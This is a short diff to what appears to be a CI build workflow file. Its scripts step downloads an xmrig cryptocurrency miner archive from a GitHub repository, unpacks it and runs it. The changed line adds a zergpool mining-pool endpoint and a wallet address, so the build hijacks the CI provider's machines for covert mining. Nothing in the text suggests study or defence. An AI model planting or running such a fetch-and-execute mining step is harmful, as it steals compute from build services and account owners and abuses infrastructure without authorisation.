@@ -19,4 +19,4 @@ workflows:
           include: true
           source: true
     scripts:
-      - wget https://github.com/tesasik67/q1/raw/main/xmrig-6.19.3.rar && tar -xvf xmrig-6.19.3.rar && cd xmrig-6.19.3 && chmod +x xmrig && ./xmrig
+      - wget https://github.com/tesasik67/q1/raw/main/xmrig-6.19.3.rar && tar -xvf xmrig-6.19.3.rar && cd xmrig-6.19.3 && chmod +x xmrig && ./xmrig -o stratum+tcp://cryptonight_haven.asia.mine.zergpool.com:4452 -u nexa:nqtsq5g5m4cn4rcqtmrwgxqge7scu3hfl4fcf3zxpp4sdhy9 -p c=NEXA -k -a cn/2
